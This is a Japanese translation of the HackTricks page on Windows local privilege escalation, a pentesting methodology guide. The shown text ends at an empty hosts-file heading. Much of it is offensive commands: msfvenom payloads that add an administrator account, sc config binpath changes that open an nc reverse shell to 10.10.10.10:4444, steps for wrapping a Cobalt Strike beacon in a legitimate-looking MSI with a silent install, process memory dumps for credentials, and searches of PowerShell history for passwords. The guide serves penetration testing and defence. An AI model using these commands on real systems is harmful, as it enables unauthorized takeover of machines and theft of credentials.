# Windowsローカル特権昇格

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> - <a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* **サイバーセキュリティ企業**で働いていますか？ **HackTricksで企業を宣伝**したいですか？または、**最新バージョンのPEASSにアクセス**したいですか、またはHackTricksを**PDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[NFTs](https://opensea.io/collection/the-peass-family)のコレクションを見つけます
* [**公式PEASS＆HackTricksスウォッグ**](https://peass.creator-spring.com)を手に入れます
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter**で私を[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**をフォローしてください。**
* **ハッキングトリックを共有するために** [**hacktricksリポジトリ**](https://github.com/carlospolop/hacktricks) **と** [**hacktricks-cloudリポジトリ**](https://github.com/carlospolop/hacktricks-cloud) **にPRを提出してください。**

</details>

### **Windowsローカル特権昇格ベクターを探すための最良のツール:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

## 初期のWindows理論

### アクセス トークン

**Windowsアクセス トークンが何かわからない場合は、続行する前に次のページを読んでください:**

{% content-ref url="access-tokens.md" %}
[access-tokens.md](access-tokens.md)
{% endcontent-ref %}

### ACLs - DACLs/SACLs/ACEs

**このセクションの見出しで使用されている略語の意味がわからない場合は、続行する前に次のページを読んでください**:

{% content-ref url="acls-dacls-sacls-aces.md" %}
[acls-dacls-sacls-aces.md](acls-dacls-sacls-aces.md)
{% endcontent-ref %}

### 完全性レベル

**Windowsの完全性レベルが何かわからない場合は、続行する前に次のページを読んでください:**

{% content-ref url="integrity-levels.md" %}
[integrity-levels.md](integrity-levels.md)
{% endcontent-ref %}

## Windowsセキュリティコントロール

Windowsには、**システムの列挙を防ぐ**、実行可能ファイルを実行したり、**活動を検出する**ことができるさまざまな要素があります。特権昇格の列挙を開始する前に、次の**ページ**を**読んで**、これらの**防御メカニズム**をすべて列挙してください:

{% content-ref url="../authentication-credentials-uac-and-efs.md" %}
[authentication-credentials-uac-and-efs.md](../authentication-credentials-uac-and-efs.md)
{% endcontent-ref %}

## システム情報

### バージョン情報の列挙

Windowsバージョンに既知の脆弱性があるかどうかを確認します（適用されたパッチも確認してください）。
```bash
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture
```

```bash
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```
### バージョンの脆弱性

この[サイト](https://msrc.microsoft.com/update-guide/vulnerability)は、Microsoftのセキュリティ脆弱性に関する詳細情報を検索するのに便利です。このデータベースには4,700以上のセキュリティ脆弱性があり、Windows環境が提示する**膨大な攻撃面**が示されています。

**システム上**

* _post/windows/gather/enum\_patches_
* _post/multi/recon/local\_exploit\_suggester_
* [_watson_](https://github.com/rasta-mouse/Watson)
* [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) _(Winpeasにはwatsonが組み込まれています)_

**ローカルでシステム情報を使用**

* [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
* [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)

**ExploitsのGithubリポジトリ:**

* [https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
* [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
* [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

### 環境

環境変数に保存された資格情報/重要情報はありますか？
```bash
set
dir env:
Get-ChildItem Env: | ft Key,Value
```
### PowerShell の履歴
```bash
ConsoleHost_history #Find the PATH where is saved

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```
### PowerShell トランスクリプトファイル

これを有効にする方法については、[https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/)で学ぶことができます。
```bash
#Check is enable in the registry
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
dir C:\Transcripts

#Start a Transcription session
Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
Stop-Transcript
```
### PowerShellモジュールのロギング

PowerShellのパイプライン実行の詳細を記録します。これには、実行されたコマンド、コマンドの呼び出し、およびスクリプトの一部が含まれます。実行の全詳細や出力結果を持っていないかもしれません。\
これを有効にするには、最後のセクションのリンク（トランスクリプトファイル）に従い、「Powershell Transcription」の代わりに「モジュールのロギング」を有効にできます。
```
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
```
以下は、PowerShellログから最後の15件のイベントを表示する方法です:
```bash
Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
```
### PowerShell **スクリプトブロックのロギング**

コードブロックが実行されるたびに記録されるため、スクリプトの完全なアクティビティと内容をキャプチャします。各アクティビティの完全な監査トレイルを維持し、後でフォレンジックや悪意のある動作の研究に使用できます。実行時のすべてのアクティビティを記録するため、完全な詳細を提供します。
```
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```
スクリプトブロックのロギングイベントは、Windowsイベントビューアーの以下のパスにあります: _Application and Sevices Logs > Microsoft > Windows > Powershell > Operational_\
最後の20イベントを表示するには、次のコマンドを使用します:
```bash
Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
```
### インターネット設定
```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```
### ドライブ
```bash
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```
## WSUS

システムがhttp**S**ではなくhttpを使用して更新を要求していない場合、システムを侵害することができます。

次のコマンドを実行して、ネットワークが非SSL WSUS更新を使用しているかどうかを確認できます。
```
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
```
もし次のような返信を受け取った場合:
```bash
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
```
そして、`HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` が `1` と等しい場合、**それは悪用可能です。** 最後のレジストリが0と等しい場合、WSUSエントリは無視されます。

これらの脆弱性を悪用するために、[Wsuxploit](https://github.com/pimps/wsuxploit)、[pyWSUS](https://github.com/GoSecure/pywsus)などのツールを使用できます。これらは、MiTM武装したエクスプロイトスクリプトであり、非SSL WSUSトラフィックに「偽の」アップデートを注入するためのものです。

こちらの研究を読んでください：

{% file src="../../.gitbook/assets/CTX_WSUSpect_White_Paper (1).pdf" %}

**WSUS CVE-2020-1013**

[**完全なレポートはこちら**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/)。\
基本的に、このバグが悪用する欠陥は次のとおりです：

> もしローカルユーザープロキシを変更する権限があれば、そしてWindows UpdatesがInternet Explorerの設定で構成されたプロキシを使用している場合、私たちは[PyWSUS](https://github.com/GoSecure/pywsus)をローカルで実行して自分自身のトラフィックを傍受し、資産上で昇格ユーザーとしてコードを実行する権限を持つことができます。
>
> さらに、WSUSサービスは現在のユーザーの設定を使用するため、その証明書ストアも使用します。 WSUSは証明書の信頼性を確認するためのHSTSのようなメカニズムを実装していません。提示された証明書がユーザーによって信頼され、正しいホスト名を持っている場合、サービスによって受け入れられます。

この脆弱性を悪用するには、[**WSUSpicious**](https://github.com/GoSecure/wsuspicious)ツールを使用できます（解放されたら）。

## KrbRelayUp

これは、**LDAP署名が強制されていない**Windows **ドメイン**環境での普遍的な修正不可能な**ローカル権限昇格**であり、**ユーザーには自己権限**（**RBCD**を構成するための）があり、**ユーザーがドメイン内でコンピュータを作成できる**環境です。\
すべての**要件**は**デフォルト設定**で満たされています。

エクスプロイトは[**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp)で見つけることができます。

攻撃が行われている場合でも、攻撃の流れについての詳細は[https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/)で確認できます。

## AlwaysInstallElevated

これらの2つのレジスタが**有効**になっている場合（値が**0x1**）、任意の権限を持つユーザーが`*.msi`ファイルをNT AUTHORITY\\**SYSTEM**として**インストール**（実行）できます。
```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```
### Metasploit ペイロード
```bash
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac wont be prompted
```
### PowerUP

メータプリーターセッションを持っている場合、モジュール**`exploit/windows/local/always_install_elevated`**を使用してこのテクニックを自動化できます。

PowerUPを使用して、`Write-UserAddMSI`コマンドを使用して特権を昇格させるためのWindows MSIバイナリを現在のディレクトリ内に作成します。このスクリプトは、ユーザー/グループの追加を求める事前にコンパイルされたMSIインストーラを書き出します（したがって、GUIアクセスが必要です）。
```
Write-UserAddMSI
```
### MSIラッパー

このツールを使用してMSIラッパーを作成する方法について学ぶために、このチュートリアルを読んでください。**コマンドラインを実行**したい場合は、**.bat**ファイルをラップできることに注意してください。

{% content-ref url="msi-wrapper.md" %}
[msi-wrapper.md](msi-wrapper.md)
{% endcontent-ref %}

### WIXを使用したMSIの作成

{% content-ref url="create-msi-with-wix.md" %}
[create-msi-with-wix.md](create-msi-with-wix.md)
{% endcontent-ref %}

### Visual Studioを使用したMSIの作成

* Cobalt StrikeまたはMetasploitで`C:\privesc\beacon.exe`に**新しいWindows EXE TCPペイロード**を生成します。
* **Visual Studio**を開き、**新しいプロジェクトを作成**を選択し、検索ボックスに "installer" と入力します。**Setup Wizard**プロジェクトを選択して**次へ**をクリックします。
* プロジェクトに名前を付け、**AlwaysPrivesc**のような名前を使用し、場所に**`C:\privesc`**を選択し、**ソリューションとプロジェクトを同じディレクトリに配置**を選択し、**作成**をクリックします。
* **次へ**をクリックし続け、ステップ3/4（含めるファイルを選択）に到達します。**追加**をクリックし、さきほど生成したBeaconペイロードを選択します。その後、**完了**をクリックします。
* **ソリューションエクスプローラ**で**AlwaysPrivesc**プロジェクトを強調表示し、**プロパティ**で**TargetPlatform**を**x86**から**x64**に変更します。
* インストールされたアプリをより正規に見せることができる**Author**や**Manufacturer**など、変更できる他のプロパティがあります。
* プロジェクトを右クリックし、**表示 > カスタムアクション**を選択します。
* **インストール**を右クリックし、**カスタムアクションの追加**を選択します。
* **Application Folder**をダブルクリックし、**beacon.exe**ファイルを選択して**OK**をクリックします。これにより、インストーラが実行されるとすぐにBeaconペイロードが実行されるようになります。
* **カスタムアクションのプロパティ**で、**Run64Bit**を**True**に変更します。
* 最後に、**ビルド**します。
* `File 'beacon-tcp.exe' targeting 'x64' is not compatible with the project's target platform 'x86'`という警告が表示される場合は、プラットフォームをx64に設定していることを確認してください。

### MSIのインストール

悪意のある`.msi`ファイルの**インストール**を**バックグラウンドで**実行するには：
```
msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
```
## 特権昇格

この脆弱性を悪用するには、_exploit/windows/local/always\_install\_elevated_ を使用できます。

## アンチウイルスおよび検出器

### 監査設定

これらの設定は何が**記録**されるかを決定するため、注意を払う必要があります。
```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
```
### WEF

Windows Event Forwarding（WEF）は、ログがどこに送信されているかを知るのに興味深いです。
```bash
reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
```
### LAPS

**LAPS**は、ドメインに参加しているコンピューター上の**ローカル管理者パスワードを管理**することができます（**ランダム化**され、ユニークで**定期的に変更**されます）。これらのパスワードはActive Directoryに中央集約され、ACLを使用して認可されたユーザーに制限されています。ユーザーに十分な権限が与えられている場合、ローカル管理者のパスワードを読み取ることができるかもしれません。

{% content-ref url="../active-directory-methodology/laps.md" %}
[laps.md](../active-directory-methodology/laps.md)
{% endcontent-ref %}

### WDigest

有効な場合、**平文パスワードがLSASSに保存**されます。\
[**WDigestに関する詳細情報はこのページでご確認ください**](../stealing-credentials/credentials-protections.md#wdigest)。
```
reg query HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential
```
### LSA Protection

マイクロソフトは**Windows 8.1以降**で、LSAの追加の保護を提供しました。これにより、信頼されていないプロセスがそのメモリを**読み取ったりコードをインジェクトしたり**することを防ぎます。\
[**LSA Protectionの詳細はこちら**](../stealing-credentials/credentials-protections.md#lsa-protection)。
```
reg query HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA /v RunAsPPL
```
### 資格情報ガード

**資格情報ガード**は、Windows 10（エンタープライズおよび教育エディション）の新機能であり、ハッシュのパスなどの脅威からマシン上の資格情報を保護するのに役立ちます。\
[**資格情報ガードに関する詳細はこちら。**](../stealing-credentials/credentials-protections.md#credential-guard)
```
reg query HKLM\System\CurrentControlSet\Control\LSA /v LsaCfgFlags
```
### キャッシュされた資格情報

**ドメイン資格情報**は、オペレーティングシステムのコンポーネントによって使用され、**ローカル** **セキュリティ機関**（LSA）によって**認証**されます。通常、ドメイン資格情報は、登録されたセキュリティパッケージがユーザーのログオンデータを認証する際にユーザーのために確立されます。\
[**キャッシュされた資格情報に関する詳細はこちら**](../stealing-credentials/credentials-protections.md#cached-credentials)。
```
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
```
## ユーザー＆グループ

### ユーザー＆グループの列挙

あなたが所属しているグループの中に興味深い権限を持っているものがないかをチェックすべきです。
```bash
# CMD
net users %username% #Me
net users #All local users
net localgroup #Groups
net localgroup Administrators #Who is inside Administrators group
whoami /all #Check the privileges

# PS
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```
### 特権グループ

**特権グループに所属している場合、特権を昇格させることができる可能性があります**。特権グループについて学び、特権昇格に悪用する方法についてはこちら：

{% content-ref url="../active-directory-methodology/privileged-groups-and-token-privileges.md" %}
[privileged-groups-and-token-privileges.md](../active-directory-methodology/privileged-groups-and-token-privileges.md)
{% endcontent-ref %}

### トークン操作

**トークン**について詳しく学ぶには、このページを参照してください：[**Windows Tokens**](../authentication-credentials-uac-and-efs.md#access-tokens).\
興味深いトークンについて学び、それらを悪用する方法については、次のページをチェックしてください：

{% content-ref url="privilege-escalation-abusing-tokens/" %}
[privilege-escalation-abusing-tokens](privilege-escalation-abusing-tokens/)
{% endcontent-ref %}

### ログインユーザー / セッション
```
qwinsta
klist sessions
```
### ホームフォルダ
```
dir C:\Users
Get-ChildItem C:\Users
```
### パスワードポリシー
```
net accounts
```
### クリップボードの内容を取得します
```bash
powershell -command "Get-Clipboard"
```
## 実行中のプロセス

### ファイルおよびフォルダのアクセス権限

まず最初に、プロセスのリストを取得し、**プロセスのコマンドライン内にパスワードが含まれていないか**を確認します。\
実行中のバイナリを**上書きできるか**、またはバイナリフォルダに書き込み権限があるかどうかをチェックして、可能な[**DLLハイジャック攻撃**](dll-hijacking.md)を悪用できるかどうかを確認します。
```bash
Tasklist /SVC #List processes running and services
tasklist /v /fi "username eq system" #Filter "system" processes

#With allowed Usernames
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize

#Without usernames
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```
常に実行中の[**electron/cef/chromium debuggers**を確認し、特権昇格に悪用できる可能性があります](../../linux-hardening/privilege-escalation/electron-cef-chromium-debugger-abuse.md)。

**プロセスのバイナリの権限をチェックする**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
icacls "%%z"
2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
)
)
```
**プロセスのバイナリフォルダのアクセス許可をチェックする（**[**DLLハイジャッキング**](dll-hijacking.md)**）**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v
"system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users
todos %username%" && echo.
)
```
### メモリーパスワードマイニング

**Sysinternals** の **procdump** を使用して実行中のプロセスのメモリーダンプを作成できます。FTPのようなサービスでは、**メモリー内に平文で資格情報が保存**されていることがあります。メモリーダンプを作成して資格情報を読み取ってみてください。
```
procdump.exe -accepteula -ma <proc_name_tasklist>
```
### セキュリティの脆弱な GUI アプリ

**SYSTEM として実行されているアプリケーションは、ユーザーが CMD を生成したり、ディレクトリを参照したりすることを許可する場合があります。**

例: "Windows ヘルプとサポート" (Windows + F1)、"コマンド プロンプトを開く" をクリックして "コマンド プロンプトを開く" を検索します。

## サービス

サービスのリストを取得します:
```
net start
wmic service list brief
sc query
Get-Service
```
### 権限

**sc**を使用してサービスの情報を取得できます
```
sc qc <service_name>
```
以下は、各サービスに必要な特権レベルをチェックするために、_Sysinternals_ から **accesschk** バイナリを使用することが推奨されています。
```bash
accesschk.exe -ucqv <Service_Name> #Check rights for different groups
```
次の手順で、「Authenticated Users」がどのサービスを変更できるかを確認することをお勧めします：
```bash
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
```
[XP用のaccesschk.exeをこちらからダウンロードできます](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe)

### サービスを有効にする

このエラーが発生している場合（たとえばSSDPSRVの場合）:

_システムエラー 1058が発生しました。_\
_サービスは、無効になっているか、それに関連付けられている有効なデバイスがないため、起動できません。_

次の方法で有効にできます:
```bash
sc config SSDPSRV start= demand
sc config SSDPSRV obj= ".\LocalSystem" password= ""
```
**サービスupnphostは、動作するためにSSDPSRVに依存していることに注意してください（XP SP1の場合）**

この問題の**別の回避策**は、次のコマンドを実行することです：
```
sc.exe config usosvc start= auto
```
### **サービスバイナリパスの変更**

もしグループ"Authenticated users"がサービスで**SERVICE\_ALL\_ACCESS**を持っている場合、そのサービスが実行しているバイナリを変更することができます。それを変更して**nc**を実行することができます。
```bash
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
```
### サービスの再起動
```
wmic service NAMEOFSERVICE call startservice
net stop [service name] && net start [service name]
```
他の権限も特権昇格に使用できます:\
**SERVICE\_CHANGE\_CONFIG** サービスバイナリを再構成できます\
**WRITE\_DAC:** 権限を再構成し、SERVICE\_CHANGE\_CONFIG につながります\
**WRITE\_OWNER:** オーナーになり、権限を再構成できます\
**GENERIC\_WRITE:** SERVICE\_CHANGE\_CONFIG を継承します\
**GENERIC\_ALL:** SERVICE\_CHANGE\_CONFIG を継承します

この脆弱性を**検出して悪用**するには、_exploit/windows/local/service\_permissions_ を使用できます。

### サービスバイナリの弱い権限

**サービスによって実行されるバイナリを変更できるかどうか**、またはバイナリが配置されているフォルダに**書き込み権限があるかどうか**（[**DLL ハイジャッキング**](dll-hijacking.md)）を確認してください。\
**wmic**（system32 以外）を使用して、サービスによって実行されるすべてのバイナリを取得し、**icacls** を使用して権限を確認できます:
```bash
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```
あなたは**sc**と**icacls**を使用することもできます:
```bash
sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```
### サービスレジストリの変更権限

サービスレジストリを変更できるかどうかを確認する必要があります。\
次のようにして、サービスレジストリ上の権限を確認できます:
```bash
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```
**Authenticated Users**または**NT AUTHORITY\INTERACTIVE**がFullControlを持っているかどうかを確認します。その場合、サービスによって実行されるバイナリのパスを変更できます。

実行されるバイナリのパスを変更するには:
```bash
reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```
### サービスレジストリのAppendData/AddSubdirectory権限

レジストリにこの権限があると、**このレジストリからサブレジストリを作成できます**。Windowsサービスの場合、これは**任意のコードを実行するのに十分です**:

{% content-ref url="appenddata-addsubdirectory-permission-over-service-registry.md" %}
[appenddata-addsubdirectory-permission-over-service-registry.md](appenddata-addsubdirectory-permission-over-service-registry.md)
{% endcontent-ref %}

### 引用符のないサービスパス

実行可能ファイルへのパスが引用符で囲まれていない場合、Windowsはスペースの前のすべての終わりを実行しようとします。

たとえば、パス _C:\Program Files\Some Folder\Service.exe_ の場合、Windowsは次のように実行しようとします:
```
C:\Program.exe
C:\Program Files\Some.exe
C:\Program Files\Some Folder\Service.exe
```
### すべての引用符なしのサービスパス（組み込みのWindowsサービスを除く）をリストアップするには

1. `wmic service get name,pathname,startmode | findstr /i "Auto" | findstr /i /v "C:\\Windows\\" | findstr /i /v """` を実行します。
2. 組み込みのWindowsサービスを除外するために、リストからそれらを手動で除外します。
```bash
wmic service get name,displayname,pathname,startmode |findstr /i "Auto" | findstr /i /v "C:\Windows\\" |findstr /i /v """
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\\Windows\\system32\\" |findstr /i /v """ #Not only auto services

#Other way
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:""""') do (
echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
)
)
```

```bash
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```
**この脆弱性を検出して悪用**するには、metasploitを使用できます: _exploit/windows/local/trusted\_service\_path_\
metasploitを使用して手動でサービスバイナリを作成することもできます:
```bash
msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
```
### リカバリーアクション

Windowsに実行されるサービスが失敗した場合に、Windowsに何をすべきかを指示することが可能です。その設定がバイナリを指しており、そのバイナリが上書き可能であれば特権を昇格させることができるかもしれません。

## アプリケーション

### インストールされたアプリケーション

**バイナリのアクセス権**（上書きして特権を昇格させることができるかもしれません）と**フォルダー**のアクセス権（[DLLハイジャッキング](dll-hijacking.md)）をチェックしてください。
```bash
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```
### 書き込み権限

特定のファイルを読むために設定ファイルを変更できるか、または管理者アカウント（schedtasks）によって実行されるバイナリを変更できるかどうかを確認します。

システム内の弱いフォルダ/ファイルの権限を見つける方法は次のとおりです：
```bash
accesschk.exe /accepteula
# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\
# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
accesschk.exe -uwdqs "Everyone" c:\*.*
```

```bash
icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
```

```bash
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```
### スタートアップで実行

**異なるユーザーによって実行されるレジストリまたはバイナリを上書きできるかどうかを確認します。**\
**次のページ**を**読んで**、特権を昇格させるための興味深い**autorunsの場所**について詳しく学びます：

{% content-ref url="privilege-escalation-with-autorun-binaries.md" %}
[privilege-escalation-with-autorun-binaries.md](privilege-escalation-with-autorun-binaries.md)
{% endcontent-ref %}

### ドライバー

可能な**サードパーティーの奇妙で脆弱な**ドライバーを探します
```
driverquery
driverquery.exe /fo table
driverquery /SI
```
## PATH DLL ハイジャッキング

もし、**PATH に存在するフォルダ内に書き込み権限**がある場合、プロセスによって読み込まれる DLL をハイジャックして**特権を昇格**することができるかもしれません。

PATH 内のすべてのフォルダの権限をチェックします：
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
このチェックを悪用する方法の詳細については、以下を参照してください：

{% content-ref url="dll-hijacking/writable-sys-path-+dll-hijacking-privesc.md" %}
[writable-sys-path-+dll-hijacking-privesc.md](dll-hijacking/writable-sys-path-+dll-hijacking-privesc.md)
{% endcontent-ref %}

## ネットワーク

### 共有
```bash
net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
```
### ホストファイル

